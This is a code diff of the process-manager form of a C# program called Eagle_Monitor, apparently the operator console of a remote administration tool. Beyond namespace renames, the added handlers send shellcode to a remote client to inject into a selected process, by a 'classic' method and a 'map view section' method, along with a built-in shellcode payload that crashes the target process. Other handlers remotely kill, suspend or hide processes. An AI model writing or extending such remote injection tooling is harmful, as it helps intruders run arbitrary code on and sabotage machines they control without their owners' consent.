@@ -1,5 +1,6 @@
 ﻿using Eagle_Monitor.Clients;
 using Eagle_Monitor.Controls;
+using Shared;
 using System;
 using System.Drawing;
 using System.Threading.Tasks;
@@ -65,11 +66,11 @@ namespace Eagle_Monitor.Forms
             C.processManagerForm.loadingCircle1.Active = true;
             C.processManagerForm.processesListView.Items.Clear();
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.ProcessManager;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_PROC };
+            D.DataReturn = new object[] { Shared.PacketType.GET_PROC };
             Task.Run(() => C.SendData(D.Serialize()));
         }
 
@@ -79,11 +80,11 @@ namespace Eagle_Monitor.Forms
             {
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.ProcessManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.KILL_PROC, processesListView.SelectedItems[0].SubItems[1].Text };
+                D.DataReturn = new object[] { Shared.PacketType.KILL_PROC, processesListView.SelectedItems[0].SubItems[1].Text };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -94,11 +95,11 @@ namespace Eagle_Monitor.Forms
             {
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.ProcessManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.SUSPEND_PROC, processesListView.SelectedItems[0].SubItems[1].Text };
+                D.DataReturn = new object[] { Shared.PacketType.SUSPEND_PROC, processesListView.SelectedItems[0].SubItems[1].Text };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -109,11 +110,11 @@ namespace Eagle_Monitor.Forms
             {
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.ProcessManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.RESUME_PROC, processesListView.SelectedItems[0].SubItems[1].Text };
+                D.DataReturn = new object[] { Shared.PacketType.RESUME_PROC, processesListView.SelectedItems[0].SubItems[1].Text };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -124,12 +125,12 @@ namespace Eagle_Monitor.Forms
             {
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.ProcessManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
                 string text = Microsoft.VisualBasic.Interaction.InputBox("New title : ");
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.SET_WND_TEXT, processesListView.SelectedItems[0].SubItems[1].Text, text };
+                D.DataReturn = new object[] { Shared.PacketType.SET_WND_TEXT, processesListView.SelectedItems[0].SubItems[1].Text, text };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -140,11 +141,11 @@ namespace Eagle_Monitor.Forms
             {
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.ProcessManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.MINIMZE_WND, processesListView.SelectedItems[0].SubItems[1].Text};
+                D.DataReturn = new object[] { Shared.PacketType.MINIMZE_WND, processesListView.SelectedItems[0].SubItems[1].Text};
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -155,11 +156,11 @@ namespace Eagle_Monitor.Forms
             {
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.ProcessManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.MAXIMIZE_WND, processesListView.SelectedItems[0].SubItems[1].Text };
+                D.DataReturn = new object[] { Shared.PacketType.MAXIMIZE_WND, processesListView.SelectedItems[0].SubItems[1].Text };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -170,11 +171,11 @@ namespace Eagle_Monitor.Forms
             {
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.ProcessManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.HIDE_WND, new IntPtr(int.Parse(processesListView.SelectedItems[0].SubItems[3].Text)) };
+                D.DataReturn = new object[] { Shared.PacketType.HIDE_WND, new IntPtr(int.Parse(processesListView.SelectedItems[0].SubItems[3].Text)) };
                 Task.Run(() => C.SendData(D.Serialize()));
             }
         }
@@ -185,12 +186,83 @@ namespace Eagle_Monitor.Forms
             {
                 Client C = Client.ClientDictionary[this.IP_Origin];
                 Data D = new Data();
-                D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+                D.Type = Shared.PacketType.PLUGIN;
                 D.Plugin = Plugins.ProcessManager;
                 D.IP_Origin = C.IP;
                 D.HWID = C.HWID;
-                D.DataReturn = new object[] { Shared.PacketTypes.PacketType.SHOW_WND, new IntPtr(int.Parse(processesListView.SelectedItems[0].SubItems[3].Text)) };
+                D.DataReturn = new object[] { Shared.PacketType.SHOW_WND, new IntPtr(int.Parse(processesListView.SelectedItems[0].SubItems[3].Text)) };
                 Task.Run(() => C.SendData(D.Serialize()));
+            }
+        }
+
+        private void crashProcessToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (processesListView.SelectedItems.Count == 1 && processesListView.SelectedItems[0].SubItems[4].Text == "64") 
+            {
+                byte[] shellcode = ShellCodePlugins.ProcessCrash_64;
+
+                Client C = Client.ClientDictionary[this.IP_Origin];
+                Data D = new Data();
+                D.Type = Shared.PacketType.PLUGIN;
+                D.Plugin = Plugins.ProcessManager;
+                D.IP_Origin = C.IP;
+                D.HWID = C.HWID;
+                D.DataReturn = new object[] { Shared.PacketType.INJECT_CLASSIC_METHOD, processesListView.SelectedItems[0].SubItems[1].Text, shellcode };
+                Task.Run(() => C.SendData(D.Serialize()));
+            }
+
+            if (processesListView.SelectedItems.Count == 1 && processesListView.SelectedItems[0].SubItems[4].Text == "32")
+            {
+                byte[] shellcode = ShellCodePlugins.ProcessCrash_32;
+
+                Client C = Client.ClientDictionary[this.IP_Origin];
+                Data D = new Data();
+                D.Type = Shared.PacketType.PLUGIN;
+                D.Plugin = Plugins.ProcessManager;
+                D.IP_Origin = C.IP;
+                D.HWID = C.HWID;
+                D.DataReturn = new object[] { Shared.PacketType.INJECT_CLASSIC_METHOD, processesListView.SelectedItems[0].SubItems[1].Text, shellcode };
+                Task.Run(() => C.SendData(D.Serialize()));
+            }
+        }
+
+        private void classicMethodToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog o = new OpenFileDialog())
+            {
+                if (o.ShowDialog() == DialogResult.OK)
+                {
+                    byte[] shellcode = Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(o.FileName), 1);
+
+                    Client C = Client.ClientDictionary[this.IP_Origin];
+                    Data D = new Data();
+                    D.Type = Shared.PacketType.PLUGIN;
+                    D.Plugin = Plugins.ProcessManager;
+                    D.IP_Origin = C.IP;
+                    D.HWID = C.HWID;
+                    D.DataReturn = new object[] { Shared.PacketType.INJECT_CLASSIC_METHOD, processesListView.SelectedItems[0].SubItems[1].Text, shellcode };
+                    Task.Run(() => C.SendData(D.Serialize()));
+                }
+            }
+        }
+
+        private void mapViewToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog o = new OpenFileDialog())
+            {
+                if (o.ShowDialog() == DialogResult.OK)
+                {
+                    byte[] shellcode = Compressor.QuickLZ.Compress(System.IO.File.ReadAllBytes(o.FileName), 1);
+
+                    Client C = Client.ClientDictionary[this.IP_Origin];
+                    Data D = new Data();
+                    D.Type = Shared.PacketType.PLUGIN;
+                    D.Plugin = Plugins.ProcessManager;
+                    D.IP_Origin = C.IP;
+                    D.HWID = C.HWID;
+                    D.DataReturn = new object[] { Shared.PacketType.INJECT_MAP_VIEW_SECTION, processesListView.SelectedItems[0].SubItems[1].Text, shellcode };
+                    Task.Run(() => C.SendData(D.Serialize()));
+                }
             }
         }
     }
